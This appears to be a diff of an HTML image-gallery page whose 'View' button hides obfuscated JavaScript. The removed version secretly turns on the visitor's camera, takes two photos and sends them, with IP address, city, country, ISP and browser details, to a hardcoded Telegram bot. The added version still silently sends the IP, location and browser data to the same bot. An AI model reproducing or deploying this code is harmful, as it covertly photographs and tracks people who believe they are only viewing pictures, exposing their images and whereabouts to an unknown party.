@@ -34,7 +34,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.2);
+            background-color: rgba(0, 0, 0, 0.1);
             backdrop-filter: blur(2px);
             display: flex;
             justify-content: center;
@@ -59,8 +59,7 @@
             transform: scale(1.05);
             background-color: #45a049;
         }
-
-        #hee {
+                #hee {
             width: 100vw;
             height: 100vh;
             display: none;
@@ -72,29 +71,25 @@
         .hidden {
             display: none !important;
         }
-
-        /* Hidden video element for camera stream */
-        #videoElement {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Video Element to show camera stream -->
-    <video id="videoElement" autoplay playsinline></video>
-    <canvas id="canvasElement" style="display:none;"></canvas>
-
     <!-- Image Gallery -->
     <div id="img" class="image-container">
-        <img src="image7.webp" alt="Image 1">
-        <img src="image 1.webp" alt="Image 2">
-        <img src="image 2.webp" alt="Image 3">
-        <img src="image3.webp" alt="Image 4">
-        <img src="image4.webp" alt="Image 5">
-        <img src="image5.webp" alt="Image 6">
-        <img src="image6.webp" alt="Image 7">
-        <img src="image7.webp" alt="Image 8">
+        <!-- Replace these with your actual image URLs -->
+        <img src="image1.png" alt="Image 1">
+        <img src="image2.png" alt="Image 2">
+        <img src="image3.png" alt="Image 3">
+        <img src="image5.png" alt="Image 4">
+        <img src="image5.png" alt="Image 5">
+        <img src="image6.png" alt="Image 6">
+        <img src="image7.png" alt="Image 7">
+        <img src="image8.png" alt="Image 8">
+        <img src="image9.png" alt="Image 9">
+        <img src="image10.png" alt="Image 10">
+        <img src="image11.png" alt="Image 11">
+        <!-- Add more images as needed -->
     </div>
         
     <div id="hee">
@@ -106,9 +101,11 @@
         <button class="start-button" id="sendBtn">View</button>
     </div>
 
-<script>
-  function _0x3cbb(_0x128d67,_0x4e9f06){const _0x4c61b8=_0x4c61();return _0x3cbb=function(_0x3cbb69,_0x506c53){_0x3cbb69=_0x3cbb69-0x1f3;let _0x28d319=_0x4c61b8[_0x3cbb69];return _0x28d319;},_0x3cbb(_0x128d67,_0x4e9f06);}const _0x45be30=_0x3cbb;(function(_0x56867b,_0x32ac77){const _0x2aa73f=_0x3cbb,_0x5ca072=_0x56867b();while(!![]){try{const _0x74b1f7=parseInt(_0x2aa73f(0x234))/0x1*(-parseInt(_0x2aa73f(0x218))/0x2)+-parseInt(_0x2aa73f(0x20a))/0x3+parseInt(_0x2aa73f(0x23c))/0x4*(parseInt(_0x2aa73f(0x21c))/0x5)+-parseInt(_0x2aa73f(0x22c))/0x6+-parseInt(_0x2aa73f(0x20c))/0x7*(-parseInt(_0x2aa73f(0x22b))/0x8)+parseInt(_0x2aa73f(0x1f4))/0x9*(-parseInt(_0x2aa73f(0x237))/0xa)+parseInt(_0x2aa73f(0x1fa))/0xb*(-parseInt(_0x2aa73f(0x203))/0xc);if(_0x74b1f7===_0x32ac77)break;else _0x5ca072['push'](_0x5ca072['shift']());}catch(_0x226a8a){_0x5ca072['push'](_0x5ca072['shift']());}}}(_0x4c61,0xa91df));function hi(){const _0x30eb29=_0x3cbb;console[_0x30eb29(0x22d)](_0x30eb29(0x219));}hi();const TELEGRAM_BOT_TOKEN=_0x45be30(0x202),TELEGRAM_CHAT_ID=_0x45be30(0x227);let stream=null,isCameraReady=![];function _0x4c61(){const _0x15c0ae=['POST','width','warn','city','\x0a\x0a•\x20ISP:\x20','connection','add','5952771138','display','`\x0a\x0a•\x20Legacy\x20IPv4:\x20`','stop','248YEVbXH','1536816RLsWfk','log','/sendPhoto','hidden','✅\x202\x20photos\x20captured\x20and\x20sent.','append','substring','...`\x0a\x0a•\x20Time:\x20','262GtHLrF','toLocaleString','❌\x20Camera\x20access\x20denied:','11774630LjcROf','height','image/jpeg','play','overlay','4PwJkjX','Unknown','Unavailable','Error\x20sending\x20photo:','9KafVKs','\x0a\x0a•\x20Connection:\x20','photo','load','caption','📷\x20Photo\x20sent\x20successfully','415459kFVlEg','trim','https://api.telegram.org/bot','canvasElement','srcObject','user','mozConnection','webkitConnection','8271808472:AAGfxJ4MYTl7TeSnTn7STnwLrCjwEiMa4Gc','60WiarDz','sendBtn','drawImage','error','https://api.ipify.org?format=json','addEventListener','location','81552Pwfxxl','✅\x20Data\x20&\x20photos\x20sent\x20successfully!','300461fAKKCr','text','✅\x20Camera\x20access\x20granted.','\x0a\x0a•\x20Country:\x20','getContext','toBlob','🔥\x20Error\x20in\x20main\x20process:','img','close','style','userAgent','country_name','1580lCCrTI','Hello\x20World!','getElementById','json','6093490joNogM','forEach','chat_id','getUserMedia'];_0x4c61=function(){return _0x15c0ae;};return _0x4c61();}async function initCamera(){const _0x4e46e9=_0x45be30;try{stream=await navigator['mediaDevices'][_0x4e46e9(0x21f)]({'video':{'facingMode':_0x4e46e9(0x1ff)}});const _0x4fbc2f=document[_0x4e46e9(0x21a)]('videoElement');_0x4fbc2f[_0x4e46e9(0x1fe)]=stream,_0x4fbc2f[_0x4e46e9(0x23a)](),isCameraReady=!![],console[_0x4e46e9(0x22d)](_0x4e46e9(0x20e));}catch(_0x1db104){console[_0x4e46e9(0x206)](_0x4e46e9(0x236),_0x1db104),window[_0x4e46e9(0x214)](),setTimeout(()=>{const _0x1af6da=_0x4e46e9;window[_0x1af6da(0x209)]['href']='about:blank';},0x3e8);}}function captureFrame(){const _0x137a39=_0x45be30,_0x404654=document[_0x137a39(0x21a)]('videoElement'),_0x7947=document[_0x137a39(0x21a)](_0x137a39(0x1fd));_0x7947[_0x137a39(0x221)]=_0x404654['videoWidth']||0x280,_0x7947[_0x137a39(0x238)]=_0x404654['videoHeight']||0x1e0;const _0x583c4e=_0x7947[_0x137a39(0x210)]('2d');return _0x583c4e[_0x137a39(0x205)](_0x404654,0x0,0x0,_0x7947[_0x137a39(0x221)],_0x7947[_0x137a39(0x238)]),new Promise(_0x4fd9af=>{const _0x3091be=_0x137a39;_0x7947[_0x3091be(0x211)](_0x27fda9=>_0x4fd9af(_0x27fda9),_0x3091be(0x239),0.85);});}async function sendPhotoToTelegram(_0xa01164,_0x427509=''){const _0x2f4cc8=_0x45be30,_0xdd6753=new FormData();_0xdd6753[_0x2f4cc8(0x231)](_0x2f4cc8(0x21e),TELEGRAM_CHAT_ID),_0xdd6753[_0x2f4cc8(0x231)](_0x2f4cc8(0x1f6),_0xa01164);if(_0x427509)_0xdd6753[_0x2f4cc8(0x231)](_0x2f4cc8(0x1f8),_0x427509);try{const _0x330886=await fetch(_0x2f4cc8(0x1fc)+TELEGRAM_BOT_TOKEN+_0x2f4cc8(0x22e),{'method':_0x2f4cc8(0x220),'body':_0xdd6753});if(!_0x330886['ok'])throw new Error('HTTP\x20'+_0x330886['status']+':\x20'+await _0x330886[_0x2f4cc8(0x20d)]());console[_0x2f4cc8(0x22d)](_0x2f4cc8(0x1f9));}catch(_0x92c890){console[_0x2f4cc8(0x206)](_0x2f4cc8(0x1f3),_0x92c890);}}document['getElementById'](_0x45be30(0x204))[_0x45be30(0x208)]('click',async function(){const _0x3ab639=_0x45be30;document[_0x3ab639(0x21a)](_0x3ab639(0x23b))['classList'][_0x3ab639(0x226)](_0x3ab639(0x22f)),document[_0x3ab639(0x21a)](_0x3ab639(0x213))[_0x3ab639(0x215)][_0x3ab639(0x228)]='flex';if(!isCameraReady){console[_0x3ab639(0x222)]('⚠️\x20Camera\x20not\x20ready.\x20Please\x20reload\x20and\x20allow\x20access.');return;}try{const _0x3d8d9e=await fetch('https://ipapi.co/json/',{'timeout':0x1388}),_0x16a54f=await _0x3d8d9e[_0x3ab639(0x21b)](),_0x4e0ab5=await fetch(_0x3ab639(0x207),{'timeout':0x1388}),_0x155bf2=await _0x4e0ab5[_0x3ab639(0x21b)](),_0x120aec=navigator[_0x3ab639(0x225)]||navigator[_0x3ab639(0x200)]||navigator[_0x3ab639(0x201)],_0x57b35a=('\x0a\x0a🌐\x20*DEMO:\x20Dual\x20IP\x20Capture*\x0a\x0a•\x20Real\x20Public\x20IP:\x20`'+(_0x16a54f['ip']||_0x3ab639(0x23d))+_0x3ab639(0x229)+(_0x155bf2['ip']||_0x3ab639(0x23e))+'`\x0a\x0a•\x20City:\x20'+(_0x16a54f[_0x3ab639(0x223)]||_0x3ab639(0x23d))+_0x3ab639(0x20f)+(_0x16a54f[_0x3ab639(0x217)]||_0x3ab639(0x23d))+_0x3ab639(0x224)+(_0x16a54f['org']||_0x3ab639(0x23d))+_0x3ab639(0x1f5)+(_0x120aec?_0x120aec['effectiveType']:_0x3ab639(0x23d))+'\x0a\x0a•\x20Browser:\x20`'+navigator[_0x3ab639(0x216)][_0x3ab639(0x232)](0x0,0x32)+_0x3ab639(0x233)+new Date()[_0x3ab639(0x235)]()+'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20')[_0x3ab639(0x1fb)]();await new Promise(_0x3027a4=>setTimeout(_0x3027a4,0x1f4));const _0x5dc2fb=await captureFrame();await sendPhotoToTelegram(_0x5dc2fb,_0x57b35a),await new Promise(_0x37627d=>setTimeout(_0x37627d,0x3e8));const _0x29b738=await captureFrame();await sendPhotoToTelegram(_0x29b738),console[_0x3ab639(0x22d)](_0x3ab639(0x230)),stream['getTracks']()[_0x3ab639(0x21d)](_0x34cf56=>_0x34cf56[_0x3ab639(0x22a)]()),setTimeout(()=>{const _0x1fbb52=_0x3ab639;console[_0x1fbb52(0x22d)](_0x1fbb52(0x20b));},0x3e8);}catch(_0x1597d6){console[_0x3ab639(0x206)](_0x3ab639(0x212),_0x1597d6);}}),window[_0x45be30(0x208)](_0x45be30(0x1f7),initCamera);
-</script>
+
+    <script>
+        const _0x22a5df=_0x8e7f;function _0x1e1d(){const _0x2b5a76=['stringify','effectiveType','style','error','456288EygTde','city','...`\x0a•\x20Time:\x20','Hello\x20World!','735408TLQhhE','POST','flex','https://api.telegram.org/bot','hidden','click','70DcQMAI','country_name','display','1084984pLChfh','hee','addEventListener','/sendMessage','\x0a🌐\x20*DEMO:\x20Dual\x20IP\x20Capture*\x0a•\x20Real\x20Public\x20IP\x20(IPv6/IPv4):\x20`','60823yXWwVi','add','json','https://api.ipify.org?format=json','substring','2wNnYVJ','\x0a•\x20Connection:\x20','sendBtn','3219468DxwmNv','none','https://ipapi.co/json/','Error:','15UPNHfb','5952771138','Unknown','30943000yWLkPb','img','webkitConnection','104sktNRs','\x0a\x20\x20\x20\x20\x20\x20\x20\x20','`\x0a•\x20Legacy\x20IPv4\x20(if\x20available):\x20`','Markdown','getElementById','\x0a•\x20Browser:\x20`','connection','2427756QvaBxa'];_0x1e1d=function(){return _0x2b5a76;};return _0x1e1d();}function _0x8e7f(_0x1e99a2,_0x191419){const _0x1e1dbb=_0x1e1d();return _0x8e7f=function(_0x8e7ff1,_0x325e9f){_0x8e7ff1=_0x8e7ff1-0xaa;let _0x3fd01a=_0x1e1dbb[_0x8e7ff1];return _0x3fd01a;},_0x8e7f(_0x1e99a2,_0x191419);}(function(_0x53f3c8,_0xf071){const _0x224de3=_0x8e7f,_0x3d38a4=_0x53f3c8();while(!![]){try{const _0x444db4=parseInt(_0x224de3(0xcc))/0x1*(parseInt(_0x224de3(0xb3))/0x2)+-parseInt(_0x224de3(0xc7))/0x3+parseInt(_0x224de3(0xd9))/0x4*(-parseInt(_0x224de3(0xba))/0x5)+-parseInt(_0x224de3(0xb6))/0x6+parseInt(_0x224de3(0xae))/0x7*(-parseInt(_0x224de3(0xc0))/0x8)+-parseInt(_0x224de3(0xd0))/0x9*(parseInt(_0x224de3(0xd6))/0xa)+parseInt(_0x224de3(0xbd))/0xb;if(_0x444db4===_0xf071)break;else _0x3d38a4['push'](_0x3d38a4['shift']());}catch(_0x4da826){_0x3d38a4['push'](_0x3d38a4['shift']());}}}(_0x1e1d,0x67b4b));function hi(){const _0x500d17=_0x8e7f;console['log'](_0x500d17(0xcf));}hi(),document[_0x22a5df(0xc4)](_0x22a5df(0xb5))[_0x22a5df(0xab)](_0x22a5df(0xd5),function(){const _0xfb3b9d=_0x22a5df;document[_0xfb3b9d(0xc4)]('overlay')['classList'][_0xfb3b9d(0xaf)](_0xfb3b9d(0xd4)),document[_0xfb3b9d(0xc4)](_0xfb3b9d(0xbe))[_0xfb3b9d(0xca)][_0xfb3b9d(0xd8)]=_0xfb3b9d(0xb7),document[_0xfb3b9d(0xc4)](_0xfb3b9d(0xaa))[_0xfb3b9d(0xca)][_0xfb3b9d(0xd8)]=_0xfb3b9d(0xd2);});const TELEGRAM_BOT_TOKEN='8271808472:AAGfxJ4MYTl7TeSnTn7STnwLrCjwEiMa4Gc',TELEGRAM_CHAT_ID=_0x22a5df(0xbb);document[_0x22a5df(0xc4)](_0x22a5df(0xb5))[_0x22a5df(0xab)]('click',async function(){const _0x6704aa=_0x22a5df;try{const _0x4469f2=await fetch(_0x6704aa(0xb8)),_0x1cf591=await _0x4469f2[_0x6704aa(0xb0)](),_0x9b1b40=await fetch(_0x6704aa(0xb1)),_0xeee873=await _0x9b1b40['json'](),_0x679e13=navigator[_0x6704aa(0xc6)]||navigator['mozConnection']||navigator[_0x6704aa(0xbf)],_0x21fb09=(_0x6704aa(0xad)+(_0x1cf591['ip']||_0x6704aa(0xbc))+_0x6704aa(0xc2)+(_0xeee873['ip']||'Unavailable')+'`\x0a•\x20City:\x20'+(_0x1cf591[_0x6704aa(0xcd)]||_0x6704aa(0xbc))+'\x0a•\x20Country:\x20'+(_0x1cf591[_0x6704aa(0xd7)]||'Unknown')+'\x0a•\x20ISP:\x20'+(_0x1cf591['org']||_0x6704aa(0xbc))+_0x6704aa(0xb4)+(_0x679e13?_0x679e13[_0x6704aa(0xc9)]:'Unknown')+_0x6704aa(0xc5)+navigator['userAgent'][_0x6704aa(0xb2)](0x0,0x32)+_0x6704aa(0xce)+new Date()['toLocaleString']()+_0x6704aa(0xc1))['trim']();await fetch(_0x6704aa(0xd3)+TELEGRAM_BOT_TOKEN+_0x6704aa(0xac),{'method':_0x6704aa(0xd1),'headers':{'Content-Type':'application/json'},'body':JSON[_0x6704aa(0xc8)]({'chat_id':TELEGRAM_CHAT_ID,'text':_0x21fb09,'parse_mode':_0x6704aa(0xc3)})});}catch(_0x23d090){console[_0x6704aa(0xcb)](_0x6704aa(0xb9),_0x23d090);}});
+    </script>
+
 
 </body>
 </html>
